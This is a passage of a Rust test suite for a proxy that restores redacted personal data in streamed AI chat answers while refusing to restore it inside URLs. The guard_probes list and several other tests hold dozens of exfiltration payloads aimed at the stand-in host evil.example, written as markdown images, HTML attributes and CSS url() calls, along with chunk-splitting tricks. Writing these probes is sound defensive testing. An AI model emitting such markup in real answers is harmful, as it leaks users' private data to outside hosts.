                    run(&e, "application/json", odd.as_bytes(), n),
                    odd.as_bytes()
                );
            }
        }
    }

    #[test]
    fn json_holding_several_values_streams_as_ndjson() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        let lines = [
            "{\"t\":\"Dear [NA\"}\n",
            "{\"t\":\"ME_1], hi\"}\n",
            "{\"done\":true}\n",
        ];
        let mut t = for_content_type(&e, SCOPE, "application/json");
        let mut early = t.push(lines[0].as_bytes()).to_vec();
        early.extend_from_slice(&t.push(lines[1].as_bytes()));
        early.extend_from_slice(&t.push(&lines[2].as_bytes()[..4]));
        // Incremental: the first two lines are out before the body ends.
        let early = String::from_utf8(early).unwrap();
        assert!(
            early.contains("Dear ") && early.contains("Ravi Kumar, hi"),
            "{early:?}"
        );
        let mut out = early.into_bytes();
        out.extend_from_slice(&t.push(&lines[2].as_bytes()[4..]));
        out.extend_from_slice(&t.finish());
        let text: String = String::from_utf8(out)
            .unwrap()
            .lines()
            .filter_map(|l| serde_json::from_str::<Value>(l).ok())
            .filter_map(|v| v["t"].as_str().map(str::to_string))
            .collect();
        assert_eq!(text, "Dear Ravi Kumar, hi");
        // One pretty-printed document is still one document.
        let doc = "{\n  \"a\": \"[NAME_1]\",\n  \"b\": [1,\n 2]\n}\n";
        let out = run(&e, "application/json", doc.as_bytes(), 3);
        let v: Value = serde_json::from_slice(&out).unwrap();
        assert_eq!(v["a"], "Ravi Kumar");
    }

    #[test]
    fn oversized_items_pass_through_raw() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        let big = "x".repeat(300);
        let sse_body = format!(
            "data: {{\"t\":\"[NAME_1]\"}}\n\ndata: {{\"t\":\"[NAME_1] {big}\"}}\n\n\
             data: {{\"t\":\"[NAME_1]\"}}\n\n"
        );
        let nd_body = format!(
            "{{\"t\":\"[NAME_1]\"}}\n{{\"t\":\"[NAME_1] {big}\"}}\n{{\"t\":\"[NAME_1]\"}}\n"
        );
        for (ct, body) in [
            ("text/event-stream", sse_body),
            ("application/x-ndjson", nd_body),
        ] {
            let mut t = for_content_type_capped(&e, SCOPE, ct, 100);
            let mut out = Vec::new();
            for c in body.as_bytes().chunks(10) {
                out.extend_from_slice(&t.push(c));
            }
            out.extend_from_slice(&t.finish());
            // What came before the oversized item is restored; from it on,
            // the stream passes through as it came.
            assert_eq!(
                String::from_utf8(out).unwrap(),
                body.replacen("[NAME_1]", "Ravi Kumar", 1),
                "{ct}"
            );
        }
    }

    /// Run `body` through a rewriter for `ct` in chunks of `n` bytes,
    /// failing as soon as it takes longer than `limit` (work that grows with
    /// the square of the body never finishes in time).
    fn run_within(
        e: &Engine,
        ct: &str,
        body: &[u8],
        n: usize,
        limit: std::time::Duration,
    ) -> Vec<u8> {
        let started = std::time::Instant::now();
        let mut t = for_content_type(e, SCOPE, ct);
        let mut out = Vec::new();
        for (i, c) in body.chunks(n).enumerate() {
            out.extend_from_slice(&t.push(c));
            if i % 1024 == 0 {
                assert!(
                    started.elapsed() < limit,
                    "{ct}: {} of {} bytes after {:?}",
                    i * n,
                    body.len(),
                    started.elapsed()
                );
            }
        }
        out.extend_from_slice(&t.finish());
        assert!(started.elapsed() < limit, "{ct}: {:?}", started.elapsed());
        out
    }

    /// Scan finding on 06da9ce: an item just under the 16 MiB cap, pushed in
    /// small chunks, must not be rescanned from its start on every chunk
    /// (newline and blank-line search, UTF-16 counting); nor may a large
    /// chunk holding many small items be shifted once per item.
    #[test]
    fn large_items_in_small_chunks_take_linear_work() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        // Generous: linear work takes about ten seconds per case
        // unoptimised; quadratic work takes hours.
        let limit = std::time::Duration::from_secs(120);
        let size = MAX_ITEM_BYTES - 64 * 1024;
        let unit = "aé😀 b";
        let filler = unit.repeat(size / unit.len());
        let text = format!("{filler} [NAME_1]");
        let want = format!("{filler} Ravi Kumar");
        let doc = json!({"t": &text}).to_string();
        let restored_doc = json!({"t": &want}).to_string();
        let cases = [
            (
                "text/event-stream",
                format!("data: {doc}\n\n"),
                format!("data: {restored_doc}\n\n"),
            ),
            (
                "application/x-ndjson",
                format!("{doc}\n"),
                format!("{restored_doc}\n"),
            ),
            ("application/json", doc.clone(), restored_doc.clone()),
            (
                "application/json",
                format!(")]}}'\n{}", frame(&format!("[[\"wrb.fr\",{doc}]]"))),
                format!(
                    ")]}}'\n{}",
                    frame(&format!("[[\"wrb.fr\",{restored_doc}]]"))
                ),
            ),
            (
                "text/plain",
                format!("{}[NAME_1]", " ".repeat(size)),
                format!("{}Ravi Kumar", " ".repeat(size)),
            ),
        ];
        for (ct, body, want) in cases {
            let out = run_within(&e, ct, body.as_bytes(), 256, limit);
            assert!(out == want.as_bytes(), "{ct}: not restored exactly");
        }
        // Many small items in one large chunk (distinct values: identical
        // ones would read as cumulative snapshots).
        let (mut nd, mut nd_want, mut i) = (String::new(), String::new(), 0);
        while nd.len() < size {
            nd.push_str(&format!("{{\"t\":\"[NAME_1] {i}\"}}\n"));
            nd_want.push_str(&format!("{{\"t\":\"Ravi Kumar {i}\"}}\n"));
            i += 1;
        }
        let out = run_within(&e, "application/x-ndjson", nd.as_bytes(), nd.len(), limit);
        assert!(
            out == nd_want.as_bytes(),
            "ndjson lines not restored exactly"
        );
        let one = frame("[[\"wrb.fr\",\"[NAME_1]\"]]");
        let body = format!(")]}}'\n{}", one.repeat(size / one.len()));
        let out = run_within(&e, "application/json", body.as_bytes(), body.len(), limit);
        let out = String::from_utf8(out).unwrap();
        assert_eq!(frames(&out).len(), size / one.len());
        assert!(!out.contains("[NAME_1]"));
    }

    #[test]
    fn text_bodies_restore_and_binary_passes() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        let body = "<p>Hi [NAME_1] — [name_1]</p>";
        for ct in ["text/plain", "text/plain; charset=utf-8"] {
            for n in 1..6 {
                let out = run(&e, ct, body.as_bytes(), n);
                assert_eq!(
                    String::from_utf8(out).unwrap(),
                    "<p>Hi Ravi Kumar — Ravi Kumar</p>"
                );
            }
        }
        // Invalid UTF-8: what came before is restored, the rest passes.
        let mut body = b"Hi [NAME_1] ".to_vec();
        body.extend_from_slice(b"\xff\xfe [NAME_1]");
        let out = run(&e, "text/plain", &body, 4);
        let mut want = b"Hi Ravi Kumar ".to_vec();
        want.extend_from_slice(b"\xff\xfe [NAME_1]");
        assert_eq!(out, want);
        // HTML (and other types) is never rewritten: AI sites render
        // answers from JSON and event streams.
        for ct in [
            "text/html; charset=utf-8",
            "text/markdown",
            "image/png",
            "application/octet-stream",
            "",
            "font/woff2",
        ] {
            assert!(for_content_type(&e, SCOPE, ct).is_passthrough(), "{ct}");
        }
        for ct in [
            "text/event-stream",
            "application/json",
            "application/x-ndjson",
            "text/plain",
        ] {
            assert!(!for_content_type(&e, SCOPE, ct).is_passthrough(), "{ct}");
        }
    }

    /// Review findings (text/plain answers): a body that looks like JSON is
    /// restored as JSON (one document, or NDJSON lines) or passes through,
    /// never as text; prose that merely starts with a bracket streams.
    #[test]
    fn text_plain_answers_are_json_or_text_never_both() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        let q = quoted_tag(&e);
        let ndjson = format!(
            "{}\n{}\n",
            json!({"t": format!("at {q}")}),
            json!({"t": "bye"})
        );
        let pointy = "{\"t\":\"![x](\\u003c//evil.example/?d= [NAME_1]\\u003e)\"}\n{\"t\":\"x\"}\n";
        let literal = "\"![x](\\u003c//evil.example/?d= [NAME_1]\\u003e) [EMAIL_1]\"";
        for n in [1, 3, 7, 1000] {
            let out = String::from_utf8(run(&e, "text/plain", ndjson.as_bytes(), n)).unwrap();
            let lines: Vec<Value> = out
                .lines()
                .map(|l| serde_json::from_str(l).unwrap_or_else(|err| panic!("{err}: {out:?}")))
                .collect();
            assert_eq!(lines[0]["t"], format!("at {QUOTED}"));
            assert_eq!(lines[1]["t"], "bye");
            // `<` escaped as Go and .NET encoders do: the guard reads the
            // decoded text, a pointy destination keeps its tag.
            let out = String::from_utf8(run(&e, "text/plain", pointy.as_bytes(), n)).unwrap();
            let first: Value = serde_json::from_str(out.lines().next().unwrap()).unwrap();
            assert_eq!(first["t"], "![x](<//evil.example/?d= [NAME_1]>)");
            let out = run(&e, "text/plain", literal.as_bytes(), n);
            let v: Value = serde_json::from_slice(&out).unwrap();
            assert_eq!(
                v, "![x](<//evil.example/?d= [NAME_1]>) ravi@example.com",
                "{n}"
            );
            // JSON-looking but neither a document nor JSON lines: as it came.
            for raw in [
                format!("{{\"t\":\"at {q}\"}}\n{{oops\n"),
                format!("[\"{q}\", ]"),
                format!("\"{q}"),
            ] {
                let out = String::from_utf8(run(&e, "text/plain", raw.as_bytes(), n)).unwrap();
                assert!(!out.contains("Lotus") || out.lines().all(|l| l.contains("oops") || serde_json::from_str::<Value>(l).is_ok()), "{raw:?} -> {out:?}");
                assert!(!out.contains(QUOTED), "{raw:?} -> {out:?}");
            }
        }
        // Prose starting with a tag or a bracket is text, restored as it
        // streams.
        let mut t = for_content_type(&e, SCOPE, "text/plain");
        let outs: Vec<Bytes> = ["[", "NAME_1] said hello", " and more"]
            .iter()
            .map(|c| t.push(c.as_bytes()))
            .collect();
        assert!(outs[1].starts_with(b"Ravi Kumar said"), "{outs:?}");
        assert_eq!(outs[2], " and more");
        assert!(t.finish().is_empty());
        for (text, start) in [
            ("[", JsonStart::Open),
            ("[1, 2", JsonStart::Open),
            ("{\"", JsonStart::Clear),
            ("[1, {", JsonStart::Clear),
            ("[[\"a\"", JsonStart::Clear),
            ("[1] see", JsonStart::Closed(3)),
            ("[NAME_1]", JsonStart::Not),
            ("[1, 2] or [", JsonStart::Closed(6)),
            ("[\"a\", ]", JsonStart::Broken),
            ("{\"v\": NaN}", JsonStart::Broken),
        ] {
            assert_eq!(json_start(text), start, "{text}");
        }
        for body in ["[1] see [NAME_1]", "{x} [NAME_1]", "\"Hi\" said [NAME_1]"] {
            for n in [1, 2, 5] {
                let out = String::from_utf8(run(&e, "text/plain", body.as_bytes(), n)).unwrap();
                assert_eq!(out, body.replace("[NAME_1]", "Ravi Kumar"), "{body:?} {n}");
            }
        }
    }

    /// The tag of [`QUOTED`] (a value with `"` and `\`) in `e`.
    fn quoted_tag(e: &Engine) -> String {
        let tag = e.redact(QUOTED, SCOPE).unwrap().text;
        assert!(tag.starts_with('[') && !tag.contains('"'), "{tag}");
        tag
    }

    const EXFIL: &str = "Hi [NAME_1] ![x](https://evil.example/?d=[NAME_1]) \
                         <a href=\"https://e/[NAME_1]\">[NAME_1]</a> [EMAIL_1]";
    /// (The link text shares a whitespace-free run with the URL before it,
    /// so it stays a tag too: over-protection is the accepted cost.)
    const EXFIL_RESTORED: &str = "Hi Ravi Kumar ![x](https://evil.example/?d=[NAME_1]) \
                                  <a href=\"https://e/[NAME_1]\">[NAME_1]</a> ravi@example.com";

    #[test]
    fn tags_inside_urls_stay_tags_everywhere() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        // Plain text, any chunking.
        for n in 1..9 {
            let out = run(&e, "text/plain", EXFIL.as_bytes(), n);
            assert_eq!(String::from_utf8(out).unwrap(), EXFIL_RESTORED, "{n}");
        }
        // A JSON document.
        let doc = json!({"parts": [EXFIL]}).to_string();
        let out = run(&e, "application/json", doc.as_bytes(), 7);
        let v: Value = serde_json::from_slice(&out).unwrap();
        assert_eq!(v["parts"][0], EXFIL_RESTORED);
        // An event stream, the URL split across events.
        let cut = EXFIL.find("d=[NA").unwrap() + 5;
        let pieces = [&EXFIL[..cut], &EXFIL[cut..]];
        for n in [1, 3, 1000] {
            let out = run(&e, "text/event-stream", &chatgpt_stream(&pieces), n);
            assert_eq!(chatgpt_text(&out), EXFIL_RESTORED);
            let out = run(&e, "text/event-stream", &claude_stream(&pieces, true), n);
            assert_eq!(claude_text(&out), EXFIL_RESTORED);
        }
        // Streamed tool input (JSON fragments).
        let input = json!({"url": "https://evil.example/?d=[NAME_1]", "q": "[NAME_1]"}).to_string();
        let mid = input.len() / 2;
        let body = sse(&[
            (
                None,
                json!({"type": "content_block_delta", "index": 1,
                          "delta": {"type": "input_json_delta", "partial_json": &input[..mid]}})
                .to_string(),
            ),
            (
                None,
                json!({"type": "content_block_delta", "index": 1,
                          "delta": {"type": "input_json_delta", "partial_json": &input[mid..]}})
                .to_string(),
            ),
            (
                None,
                json!({"type": "content_block_stop", "index": 1}).to_string(),
            ),
        ]);
        let out = run(&e, "text/event-stream", &body, 2);
        let json: String = events(&out)
            .iter()
            .filter_map(|ev| serde_json::from_str::<Value>(&ev.data).ok())
            .filter_map(|v| v["delta"]["partial_json"].as_str().map(str::to_string))
            .collect();
        let v: Value = serde_json::from_str(&json).unwrap();
        assert_eq!(
            v,
            json!({"url": "https://evil.example/?d=[NAME_1]", "q": "Ravi Kumar"})
        );
    }

    /// The review's URL-guard probes (review-T2 C1, I1): a real value must
    /// never land in any of these.
    fn guard_probes() -> Vec<(&'static str, String)> {
        let (n, e) = ("[NAME_1]", "[EMAIL_1]");
        vec![
            ("md image", format!("![x](//evil.example/?d={e})")),
            (
                "pointy escaped >",
                format!("![x](<//evil.example/?d=\\>{n}>)"),
            ),
            (
                "pointy with spaces",
                format!("![x](<//evil.example/a b {n}>)"),
            ),
            (
                "nbsp in bare dest",
                format!("![x](https://evil.example/?d=\u{a0}{e})"),
            ),
            (
                "ideographic space",
                format!("![x](https://evil.example/?d=\u{3000}{e})"),
            ),
            (
                "refdef in blockquote",
                format!("> [r]: //evil.example/?d={e}\n\n![x][r]"),
            ),
            (
                "refdef in list",
                format!("- [r]: //evil.example/?d={e}\n\n![x][r]"),
            ),
            (
                "refdef after lone CR",
                format!("hi\r[r]: //evil.example/?d={e}\r\r![x][r]"),
            ),
            ("www autolink", format!("see www.evil.example/?d={e}")),
            ("www no path", format!("see www.{e}.evil.example")),
            (
                "css url quoted )",
                format!("<div style=\"background:url('//evil.example/?x=){e}')\">"),
            ),
            (
                "css url newline",
                format!("<div style=\"background:url(\n'//evil.example/?d={e}')\">"),
            ),
            (
                "style url quoted )",
                format!("<style>p{{background:url('//e/?x=) {e}')}}</style>"),
            ),
            (
                "long ws before =",
                format!("<img src{}=\"//evil.example/?d={e}\">", " ".repeat(120)),
            ),
            (
                "imagesrcset",
                format!("<link rel=preload as=image imagesrcset=\"//evil.example/?d={e} 1x\">"),
            ),
            (
                "meta refresh",
                format!("<meta http-equiv=refresh content=\"0;url=//evil.example/?d={e}\">"),
            ),
            (
                "ping",
                format!("<a ping=\"//evil.example/?d={e}\" href=\"#\">x</a>"),
            ),
            (
                "image-set",
                format!("<p style='background-image:image-set(\"//evil.example/?d={e}\" 1x)'>"),
            ),
            (
                "@import string",
                format!("<style>@import \"//evil.example/?d={e} \";</style>"),
            ),
            ("autolink no slashes", format!("<http:evil.example/?d={e}>")),
            ("key=value", format!("track?id=1&mail={e}")),
            ("bare url", format!("https://evil.example/?d=x\u{2003}{n}")),
            // Spaces inside URLs (the engine's run rule alone would miss
            // these; the syntax guard must catch them).
            (
                "pointy space",
                format!("![x](<https://evil.example/?d= {n}>)"),
            ),
            (
                "refdef pointy space",
                format!("[r]: <//evil.example/?d= {n}>\n\n![x][r]"),
            ),
            (
                "img src dq space",
                format!("<img src=\"https://evil.example/?d= {n}\">"),
            ),
            (
                "img src sq space",
                format!("<img src='//evil.example/?d= {n}'>"),
            ),
            (
                "css url space",
                format!("<style>p{{background:url('//evil.example/?d= {n}')}}</style>"),
            ),
            (
                "@import space",
                format!("<style>@import \"//evil.example/? {n}\";</style>"),
            ),
        ]
    }

    #[test]
    fn review_guard_probes_never_restore_into_urls() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        for (label, text) in guard_probes() {
            for n in [1, 3, text.len()] {
                let out = String::from_utf8(run(&e, "text/plain", text.as_bytes(), n)).unwrap();
                assert!(
                    !out.contains("Ravi Kumar") && !out.contains("ravi@example.com"),
                    "{label} (chunks of {n}): {out}"
                );
                assert_eq!(out, text, "{label}: unrestored tags stay as they were");
            }
            // The same text as a JSON leaf and as streamed deltas.
            let doc = json!({"parts": [&text]}).to_string();
            let out = run(&e, "application/json", doc.as_bytes(), 5);
            assert!(
                !String::from_utf8_lossy(&out).contains("ravi@example.com"),
                "{label} json"
            );
            // Split in the middle, and right after the last space before
            // the tag.
            let mid = (text.len() / 2..text.len())
                .find(|&i| text.is_char_boundary(i))
                .unwrap();
            let tag_at = text.rfind('[').unwrap();
            let after_space = text[..tag_at].rfind(' ').map_or(mid, |i| i + 1);
            for cut in [mid, after_space] {
                let pieces = [&text[..cut], &text[cut..]];
                let out = run(&e, "text/event-stream", &claude_stream(&pieces, true), 7);
                assert_eq!(claude_text(&out), text, "{label} sse, cut at {cut}");
                let out = run(&e, "text/event-stream", &chatgpt_stream(&pieces), 3);
                assert_eq!(chatgpt_text(&out), text, "{label} delta sse, cut at {cut}");
                let mut t = for_content_type(&e, SCOPE, "text/plain");
                let mut out = t.push(pieces[0].as_bytes()).to_vec();
                out.extend_from_slice(&t.push(pieces[1].as_bytes()));
                out.extend_from_slice(&t.finish());
                assert_eq!(
                    String::from_utf8(out).unwrap(),
                    text,
                    "{label} text, cut at {cut}"
                );
            }
        }
        // Plain tags elsewhere in the same text are still restored.
        let out = run(
            &e,
            "text/plain",
            b"Hi [NAME_1], ![x](<//e/\\>[NAME_1]>) bye [EMAIL_1]",
            4,
        );
        assert_eq!(
            String::from_utf8(out).unwrap(),
            "Hi Ravi Kumar, ![x](<//e/\\>[NAME_1]>) bye ravi@example.com"
        );
    }

    /// The data of every event in `out`.
    fn datas(out: &[u8]) -> Vec<String> {
        events(out).into_iter().map(|ev| ev.data).collect()
    }

    #[test]
    fn json_prefixes() {
        for t in [
            "{",
            "[",
            "{\"q\": \"[TER",
            "{\"q\": \"a\\\"b",
            "[1, \"a",
            "[[{\"a\":[",
            "[n",
            "[tr",
            "{\"a\": 1, \"b\"",
        ] {
            assert!(is_json_prefix(t), "{t}");
        }
        for t in [
            "[NAME_1] said",
            "[name_1]",
            "[1] see",
            "[1]",
            "{NAME_1}",
            "{\"a\": 1} more",
            "[na",
            "text",
            "",
            "{\"a\" 1",
        ] {
            assert!(!is_json_prefix(t), "{t}");
        }
    }

    #[test]
    fn json_looking_data_is_never_restored_as_text() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        let q = quoted_tag(&e);
        // Lone surrogates and a BOM (which browsers' JSON.parse accept) are
        // parsed tolerantly; the value lands JSON-escaped.
        let lone = format!(
            "{{\"p\":\"/message/content/parts/0\",\"o\":\"append\",\"v\":\"\\ud83d at {q}\"}}"
        );
        let bom = format!("\u{feff}{{\"t\":\"{q}\"}}");
        let body = sse(&[(Some("delta"), lone), (None, bom)]);
        let d = datas(&run(&e, "text/event-stream", &body, 4));
        let v: Value = serde_json::from_str(&d[0]).unwrap_or_else(|err| panic!("{err}: {}", d[0]));
        assert_eq!(v["v"], format!("\u{fffd} at {QUOTED}"));
        let v: Value = serde_json::from_str(&d[1]).unwrap_or_else(|err| panic!("{err}: {}", d[1]));
        assert_eq!(v["t"], QUOTED);
        // JSON-looking data that still does not parse passes through as it
        // came, never restored as text.
        for raw in [
            format!("{{\"v\": NaN, \"t\": \"{q}\"}}"),
            format!("[\"{q}\", ]"),
            format!("\"{q}"),
        ] {
            let body = sse(&[(None, raw.clone())]);
            assert_eq!(
                datas(&run(&e, "text/event-stream", &body, 3)),
                std::slice::from_ref(&raw)
            );
            let line = format!("{raw}\n");
            assert_eq!(
                run(&e, "application/x-ndjson", line.as_bytes(), 3),
                line.as_bytes()
            );
        }
        // JSON text streamed under an unknown key is restored with JSON
        // escaping.
        let doc = json!({"q": q}).to_string();
        let body = sse(&[
            (None, json!({"type": "x", "delta": &doc[..8]}).to_string()),
            (None, json!({"type": "x", "delta": &doc[8..]}).to_string()),
        ]);
        let d = datas(&run(&e, "text/event-stream", &body, 5));
        let text: String = d
            .iter()
            .map(|x| {
                serde_json::from_str::<Value>(x).unwrap()["delta"]
                    .as_str()
                    .unwrap()
                    .to_string()
            })
            .collect();
        let v: Value = serde_json::from_str(&text).unwrap_or_else(|err| panic!("{err}: {text}"));
        assert_eq!(v["q"], QUOTED);
        // JSON served as text/plain is restored as a document: escapes are
        // decoded first, so `\/\/` cannot hide a URL from the guard.
        let doc = "{\"a\":\"https:\\/\\/evil.example\\/?d=[EMAIL_1]\",\"b\":\"[NAME_1]\"}";
        let out = run(&e, "text/plain", doc.as_bytes(), 3);
        let v: Value = serde_json::from_slice(&out).unwrap();
        assert_eq!(v["a"], "https://evil.example/?d=[EMAIL_1]");
        assert_eq!(v["b"], "Ravi Kumar");
        // A text answer that merely starts with a bracket is still text.
        let out = run(&e, "text/plain", b"[NAME_1] is here", 3);
        assert_eq!(out, b"Ravi Kumar is here");
    }

    #[test]
    fn patch_continuations_and_unknown_ops_keep_their_state() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        // The review's probe: a bare `{"v"}` after a patch continues the
        // last op of the batch (and its URL guard state).
        let body = sse(&[
            (
                Some("delta"),
                json!({"p": "", "o": "add", "v": {"message": {"content": {"parts": [""]}}}})
                    .to_string(),
            ),
            (
                Some("delta"),
                json!({"p": "", "o": "patch", "v": [
                    {"p": "/message/content/parts/0", "o": "append",
                     "v": "see ![x](//evil.example/?d="}]})
                .to_string(),
            ),
            (
                Some("delta"),
                json!({"v": "[EMAIL_1]) and [EMA"}).to_string(),
            ),
            (Some("delta"), json!({"v": "IL_1] end"}).to_string()),
            (None, "[DONE]".to_string()),
        ]);
        for n in [1, 7, 1000] {
            let out = run(&e, "text/event-stream", &body, n);
            let text: String = datas(&out)
                .iter()
                .filter_map(|d| serde_json::from_str::<Value>(d).ok())
                .map(|v| match &v["v"] {
                    Value::String(s) => s.clone(),
                    Value::Array(ops) => ops[0]["v"].as_str().unwrap_or("").to_string(),
                    _ => String::new(),
                })
                .collect();
            assert_eq!(
                text,
                "see ![x](//evil.example/?d=[EMAIL_1]) and ravi@example.com end"
            );
        }
        // An op parda does not know (`truncate`) does not reset the text's
        // state.
        let body = sse(&[
            (
                Some("delta"),
                json!({"p": "/message/content/parts/0", "o": "append", "v": "![x](//e/?d="})
                    .to_string(),
            ),
            (
                Some("delta"),
                json!({"p": "/message/content/parts/0", "o": "truncate", "v": 12}).to_string(),
            ),
            (
                Some("delta"),
                json!({"p": "/message/content/parts/0", "o": "append", "v": "[EMAIL_1])"})
                    .to_string(),
            ),
        ]);
        let out = run(&e, "text/event-stream", &body, 1000);
        assert!(
            !String::from_utf8_lossy(&out).contains("ravi@"),
            "{}",
            String::from_utf8_lossy(&out)
        );
        // The same inside a patch batch, followed by a bare `{"v"}` that
        // continues the batch's last op.
        let body = sse(&[
            (
                Some("delta"),
                json!({"p": "/message/content/parts/0", "o": "append",
                       "v": "<img alt=x src=\"//e/?d= "})
                .to_string(),
            ),
            (
                Some("delta"),
                json!({"p": "", "o": "patch", "v": [
                    {"p": "/message/content/parts/0", "o": "truncate", "v": 20},
                    {"p": "/message/content/parts/0", "o": "append", "v": "[EMAIL_1] "}]})
                .to_string(),
            ),
            (Some("delta"), json!({"v": "[NAME_1]\">"}).to_string()),
        ]);
        for n in [1, 9, 1000] {
            let out = String::from_utf8_lossy(&run(&e, "text/event-stream", &body, n)).into_owned();
            assert!(
                !out.contains("ravi@") && !out.contains("Ravi"),
                "{n}: {out}"
            );
        }
    }

    /// M3: a forced flush (too many events held back) in the middle of a
    /// streamed JSON value keeps the value's URL-guard state, and the text
    /// after the flush still goes out.
    #[test]
    fn forced_flushes_keep_the_guard_state() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        // Inside an HTML tag, `[NAM` (an attribute name) is held back. The
        // hold limit flushes it, and the value goes on with a quoted
        // attribute value: a URL, even with a space in it.
        let pieces = [
            r#"{"html": "<img alt=x [NAM"#,
            r#"E_1] src=\"//evil.example/?d= [NAME_1]\">"}"#,
        ];
        let delta = |p: &str| {
            json!({"type": "content_block_delta", "index": 1,
                   "delta": {"type": "input_json_delta", "partial_json": p}})
            .to_string()
        };
        let mut evs = vec![
            (
                Some("content_block_start"),
                json!({"type": "content_block_start", "index": 1,
                       "content_block": {"type": "tool_use", "id": "t1", "name": "show",
                                         "input": {}}})
                .to_string(),
            ),
            (Some("content_block_delta"), delta(pieces[0])),
        ];
        for _ in 0..MAX_HELD_EVENTS + 6 {
            evs.push((Some("ping"), json!({"type": "ping"}).to_string()));
        }
        evs.push((Some("content_block_delta"), delta(pieces[1])));
        evs.push((
            Some("content_block_stop"),
            json!({"type": "content_block_stop", "index": 1}).to_string(),
        ));
        let body = sse(&evs);
        for n in [1, 13, 100_000] {
            let out = run(&e, "text/event-stream", &body, n);
            let json_text: String = events(&out)
                .iter()
                .filter_map(|ev| serde_json::from_str::<Value>(&ev.data).ok())
                .filter_map(|v| v["delta"]["partial_json"].as_str().map(str::to_string))
                .collect();
            let v: Value = serde_json::from_str(&json_text)
                .unwrap_or_else(|err| panic!("{n}: {err}: {json_text}"));
            assert_eq!(
                v["html"], "<img alt=x [NAME_1] src=\"//evil.example/?d= [NAME_1]\">",
                "{n}"
            );
        }
    }

    #[test]
    fn values_needing_escapes_keep_stream_json_valid() {
        let dir = tempfile::tempdir().unwrap();
        let e = tagged(dir.path());
        let q = quoted_tag(&e);
        // The tag split across events, in delta-encoded and Claude streams.
        let text = format!("at {q} ok");
        let pieces = [&text[..5], &text[5..7], &text[7..]];
        for n in [1, 4, 1000] {
            for body in [chatgpt_stream(&pieces), claude_stream(&pieces, true)] {
                let out = run(&e, "text/event-stream", &body, n);
                for ev in events(&out) {
                    if ev.data != "[DONE]" {
                        serde_json::from_str::<Value>(&ev.data)
                            .unwrap_or_else(|err| panic!("{err}: {}", ev.data));
                    }
                }
                let got = if body == chatgpt_stream(&pieces) {
                    chatgpt_text(&out)
                } else {
                    claude_text(&out)
                };
                assert_eq!(got, format!("at {QUOTED} ok"));
            }
        }
        // Tool input fragments are JSON-escaped.
        let input = json!({"addr": q}).to_string();
        let body = sse(&[
            (
                None,
                json!({"type": "content_block_delta", "index": 0,
                          "delta": {"type": "input_json_delta", "partial_json": &input[..9]}})
                .to_string(),
            ),
            (
                None,
                json!({"type": "content_block_delta", "index": 0,
                          "delta": {"type": "input_json_delta", "partial_json": &input[9..]}})
                .to_string(),
            ),
        ]);
        let out = run(&e, "text/event-stream", &body, 3);
        let json: String = events(&out)
            .iter()
            .filter_map(|ev| serde_json::from_str::<Value>(&ev.data).ok())
            .filter_map(|v| v["delta"]["partial_json"].as_str().map(str::to_string))
            .collect();
        let v: Value = serde_json::from_str(&json).unwrap_or_else(|err| panic!("{err}: {json}"));
        assert_eq!(v["addr"], QUOTED);
        // NDJSON: parsed per line; a line that is not JSON passes through.
        let body = format!(
            "{}\nnot json [NAME_1]\n{}\n",
            json!({"t": format!("{q} [NAME_1]")}),
            json!({"t": "[EMAIL_1]"})
        );
        let out = String::from_utf8(run(&e, "application/x-ndjson", body.as_bytes(), 6)).unwrap();
        let lines: Vec<&str> = out.lines().collect();
        let first: Value = serde_json::from_str(lines[0]).unwrap();
        assert_eq!(first["t"], format!("{QUOTED} Ravi Kumar"));
        assert_eq!(lines[1], "not json [NAME_1]");
        let last: Value = serde_json::from_str(lines[2]).unwrap();
        assert_eq!(last["t"], "ravi@example.com");
    }

    /// Split `text` at the char boundaries in `cuts` (byte offsets, any order).
    fn split_at(text: &str, cuts: &[usize]) -> Vec<String> {
        let mut at: Vec<usize> = cuts
            .iter()
            .map(|c| c % (text.len() + 1))
            .filter(|c| text.is_char_boundary(*c))
            .collect();
        at.sort_unstable();
        at.dedup();
        let mut out = Vec::new();
        let mut last = 0;
        for c in at {
            out.push(text[last..c].to_string());
            last = c;
        }
        out.push(text[last..].to_string());
        out
    }

    fn arb_text() -> impl Strategy<Value = String> {
        let token = prop_oneof![
            Just("[NAME_1]".to_string()),
            Just("[name_1]".to_string()),
            Just("[EMAIL_1]".to_string()),
            Just("[NAME_2]".to_string()),
            Just("[".to_string()),
            Just("]".to_string()),
            Just("NAME".to_string()),
            Just(" ".to_string()),
            Just("é".to_string()),
            Just("![i](".to_string()),
            Just("https://".to_string()),
            Just(" <a href=\"".to_string()),
            Just("\"".to_string()),
            Just("\n[1]: ".to_string()),
            Just(")".to_string()),
            Just("\\>".to_string()),
            Just(">".to_string()),
            Just("](<".to_string()),
            Just("\u{a0}".to_string()),
            Just("\u{3000}".to_string()),
            Just("\n> ".to_string()),
            Just("\n- ".to_string()),
            Just("\r".to_string()),
            Just("www.".to_string()),
            Just("<http:".to_string()),
            "[a-z ]{1,6}",
        ];
        proptest::collection::vec(token, 0..14).prop_map(|v| v.concat())
    }

    /// Every link destination, URL and attribute value in `text`, found the
    /// way CommonMark / GFM renderers and browsers do (a reference oracle,
    /// written independently of the guard).
    fn destinations(text: &str) -> Vec<String> {
        let c: Vec<char> = text.chars().collect();
        let n = c.len();
        let ctrl = |ch: char| (ch as u32) <= 0x20 || ch as u32 == 0x7f;
        // A destination; `None` when there is none (CommonMark: `<…>` must be
        // closed by `>` on the same line, and a bare one cannot start with
        // `<`).
        let dest = |mut i: usize| -> Option<String> {
            while i < n && ctrl(c[i]) {
                i += 1;
            }
            let mut d = String::new();
            if i < n && c[i] == '<' {
                i += 1;
                while i < n && c[i] != '>' && c[i] != '\n' && c[i] != '\r' {
                    if c[i] == '\\' && i + 1 < n {
                        d.push(c[i]);
                        i += 1;
                    }
                    d.push(c[i]);
                    i += 1;
                }
                if i >= n || c[i] != '>' {
                    return None;
                }
            } else {
                let mut depth = 0;
                while i < n && !ctrl(c[i]) {
